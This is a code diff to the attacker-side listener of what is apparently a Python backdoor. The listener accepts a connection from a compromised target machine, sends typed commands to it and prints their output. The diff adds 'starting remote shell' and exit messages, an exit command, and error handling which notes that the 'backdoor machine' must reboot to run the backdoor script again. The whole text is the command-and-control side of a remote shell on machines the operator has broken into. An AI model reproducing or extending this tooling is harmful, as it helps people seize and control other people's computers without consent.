@@ -14,6 +14,7 @@ def main():
         conn, address = server_listening_socket.accept()
         with conn:
             print('connection received from', address)
+            print('starting remote shell')
 
             client_socket = Socket(conn) # keep same socket alive for every command we send
 
@@ -26,6 +27,10 @@ def main():
                 # get user command and send to target machine
                 user_input = input()
                 client_socket.send(user_input)
+                if (user_input.strip() == 'exit'):
+                    print('closing remote shell (backdoor machine must reboot to regain access)')
+                    break
+                
 
                 # wait for backdoor to send command output
                 command_output = client_socket.receive()
@@ -40,4 +45,8 @@ def main():
                 # print()
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except:
+        print('Some error has occured which has broken the socket connection between the target and attack machine.')
+        print('To regain access, the target machine must reboot to run the backdoor script again.')
